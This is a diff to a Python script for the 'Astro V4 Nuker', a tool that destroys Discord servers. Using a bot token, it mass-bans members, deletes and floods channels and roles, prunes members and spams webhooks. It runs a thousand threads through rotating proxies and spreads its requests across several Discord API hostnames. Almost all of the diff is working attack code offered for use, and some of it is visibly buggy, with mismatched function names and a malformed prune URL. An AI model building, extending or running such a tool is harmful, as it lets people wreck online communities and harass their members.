@@ -22,6 +22,46 @@ class astro:
        print(f'\33]0;{terminal_title}\a', end='', flush=True)
        os.system("clear")
 
+    menulogo = f'''
+                                                              - Astro V4 -
+                                                     ___
+                                                  ,o88888
+                                               ,o8888888'
+                         ,:o:o:oooo.        ,8O88Pd8888"                             :::      :::::::: ::::::::::: :::::::::   ::::::::
+                     ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
+                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
+                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"                            +#++:++#++: +#++:++#++    +#+     +#++:++#:  +#+    +:+
+                 , ..:.::o:ooOoOO8O888O8O,COCOO"                             +#+     +#+        +#+    +#+     +#+    +#+ +#+    +#+
+                , . ..:.::o:ooOoOOOO8OOOOCOCO"                              ###     ###  ########     ###     ###    ###  ########
+                 . ..:.::o:ooOoOoOO8O8OCCCC"o
+                    . ..:.::o:ooooOoCoCCC"o:o                                                    --------------
+                    . ..:.::o:o:,cooooCo"oo:o:                                               _   __      __
+                 `   . . ..:.:cocoooo"'o:o:::'                                              / | / /_  __/ /_____  _____
+                 .`   . ..::ccccoc"'o:o:o:::'                                              /  |/ / / / / //_/ _ \/ ___/
+                :.:.    ,c:cccc"':.:.:.:.:.'                                              / /|  / /_/ / ,< /  __/ /
+              ..:.:"'`::::c:"'..:.:.:.:.:.'                                              /_/ |_/\__,_/_/|_|\___/_/
+            ...:.'.:.::::"'    . . . . .'
+           .. . ....:."' `   .  . . ''
+         . . . ...."'
+         .. . ."'
+        .
+
+
+                                    [1] - massban ids                         [2] - massban scraped
+                                    [3] - delete channels                     [4] - create channels
+                                    [5] - delete roles                        [6] - create roles
+                                    [7] - prune members                       [8] - spam server (UNFINISHED)
+
+> astro.cybin.cc
+> made by horrid
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+                                 $ That's one small step for man, one giant leap for mankind. - Armstrong $
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+                                                                    Log:
+
+'''
     logo = f'''
                                                               - Astro V4 -
                                                      ___
@@ -57,6 +97,7 @@ class astro:
                                                                     Log:
 
 '''
+
     print(Colorate.Vertical(Colors.yellow_to_red, logo, 1))
     print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - loading script...", 1))
     time.sleep(5)
@@ -73,12 +114,16 @@ class astro:
     token = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter token: \u001b[0m", 1))
     guild = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter guild id: \u001b[0m", 1))
     channame = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter channel name: \u001b[0m", 1))
+    channame2 = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter second channel name: \u001b[0m", 1))
+    channames = [channame, channame2]
+    jsonparamrole = {"":""}
     option = []
     headers = {"Authorization": f"Bot {token}"}
     q = queue.Queue()
     apiv = ["v9", "v6"]
     count = 0
-    jsonparam = {"name": channame}
+    jsonparam = {"name": random.choice(channames)}
+    pruneparam = {"days": 1}
 
     def chandelreqsend():
         try:
@@ -108,9 +153,27 @@ class astro:
                 p = open("proxies.txt", "r")
                 pr = p.readlines()
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers, data=astro.jsonparam)
+                s = req(url, headers=headers, json=astro.jsonparam)
                 astro.count += 1
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel created - status code: {s.status_code} - time: {time.ctime()}", 1))
+                astro.q.task_done()
+        except Exception as err:
+            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
+            else:
+                print(err)
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
+
+    def rolecrereqsend():
+        try:
+            while True:
+                req, url, headers = astro.q.get()
+                p = open("proxies.txt", "r")
+                pr = p.readlines()
+                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+                s = req(url, headers=headers, json=astro.jsonparamrole)
+                astro.count += 1
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} role created - status code: {s.status_code} - time: {time.ctime()}", 1))
                 astro.q.task_done()
         except Exception as err:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
@@ -149,7 +212,7 @@ class astro:
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
                 s = req(url, headers=headers)
                 astro.count += 1
-                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} deleted channels - status code: {s.status_code} - time: {time.ctime()}", 1))
                 if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
                     print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
                     for i in range(50):
@@ -159,6 +222,45 @@ class astro:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
             else:
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
+
+    def roledelsend():
+        try:
+            while True:
+                req, url, headers = astro.q.get()
+                p = open("proxies.txt", "r")
+                pr = p.readlines()
+                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+                s = req(url, headers=headers)
+                astro.count += 1
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} deleted roles - status code: {s.status_code} - time: {time.ctime()}", 1))
+                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
+                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
+                    for i in range(50):
+                        input()
+                astro.q.task_done()
+        except Exception as err:
+            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
+            else:
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
+
+    def prunereqsend():
+        try:
+            while True:
+                req, url, headers = astro.q.get()
+                p = open("proxies.txt", "r")
+                pr = p.readlines()
+                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+                s = req(url, headers=headers, json=astro.pruneparam)
+                astro.count += 1
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - pruned members - status code: {s.status_code} - time: {time.ctime()}", 1))
+                astro.q.task_done()
+        except Exception as err:
+            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
+            else:
+                print(err)
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
     def idworker():
@@ -185,6 +287,21 @@ class astro:
             ranchancrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/channels/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/channels"]
             astro.q.put((httpx.post, random.choice(ranchancrapi), astro.headers))
 
+    def roledelworker():
+        for i in range(1000):
+            ranroledelapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/roles",f"https://discordapp.com/api/v9/guilds/{astro.guild}/roles", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/roles", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/roles"]
+            astro.q.put((httpx.delete, random.choice(ranroledelapi), astro.headers))
+
+    def rolemakeworker():
+        for i in range(1000):
+            ranrolecrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/roles/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/roles/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/roles/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/roles"]
+            astro.q.put((httpx.post, random.choice(ranrolecrapi), astro.headers))
+
+    def pruneworker():
+        for i in range(10):
+            url = f"https://discord.com/v9/guilds/{astro.guild}/prune/"
+            astro.q.put((httpx.post, url, astro.headers))
+
     @client.event
     async def on_connect():
         try:
@@ -194,25 +311,25 @@ class astro:
             print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - guild id is invalid", 1))
             input()
             os._exit(0)
+        print(astro.menu)
         print("astro@localhost - scraping..")
         members = await guild.chunk()
         print("astro@localhost - done.")
+
         with open('scraped/channels.txt', 'a') as c:
             for channel in id.channels:
                 c.write(f"{channel.id}\n")
+
         with open("scraped/roles.txt", "a") as o:
             for role in id.roles:
                 o.write(f"{role.id}\n")
+
         with open('scraped/scraped.txt', 'a') as z:
             for member in members:
                 z.write(str(member.id) + "\n")
-        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [1] massban ids?", 1))
-        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [2] massban scraped?", 1))
-        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [3] delete channels?", 1))
-        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [4] delete roles?", 1))
-        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [5] make channels? (UNFINISHED)", 1))
-        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [6] spam channels (UNFINISHED)", 1))
+
         option = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - choice: \u001b[0m", 1))
+
         if option == "1":
             if os.name == "nt":
                 os.system("cls")
@@ -224,6 +341,7 @@ class astro:
             astro.idworker()
             for x in range(1000):
                 threading.Thread(target=astro.massbansend, daemon=True).start()
+
         if option == "2":
             if os.name == "nt":
                 os.system("cls")
@@ -235,6 +353,7 @@ class astro:
             astro.massbanworker()
             for x in range(1000):
                 threading.Thread(target=astro.massbansend, daemon=True).start()
+
         if option == "3":
             if os.name == "nt":
                 os.system("cls")
@@ -246,6 +365,7 @@ class astro:
             astro.channeldelworker()
             for x in range(1000):
                 threading.Thread(target=astro.chandelreqsend, daemon=True).start()
+
         if option == "4":
             if os.name == "nt":
                 os.system("cls")
@@ -257,6 +377,51 @@ class astro:
             astro.channelmakeworker()
             for x in range(1000):
                 threading.Thread(target=astro.chancrereqsend, daemon=True).start()
+
+        if option == "5":
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
+            time.sleep(5)
+            print(astro.option)
+            astro.roledelworker()
+            for x in range(1000):
+                threading.Thread(target=astro.roledelreqsend, daemon=True).start()
+
+        if option == "6":
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
+            time.sleep(5)
+            print(astro.option)
+            astro.rolemakeworker()
+            for x in range(1000):
+                threading.Thread(target=astro.rolecrereqsend, daemon=True).start()
+
+        if option == "7":
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
+            time.sleep(5)
+            print(astro.option)
+            astro.pruneworker()
+            for x in range(1):
+                threading.Thread(target=astro.prunereqsend, daemon=True).start()
+
+@client.event
+async def on_guild_channel_create(channel):
+    try:
+       webhook = await channel.create_webhook(name=random.choice(webhookname))
+       for i in range(100):
+           await webhook.send(random.choice(spammessage))
+    except Exception:
+      pass
 
 if __name__ == "__main__":
     try:
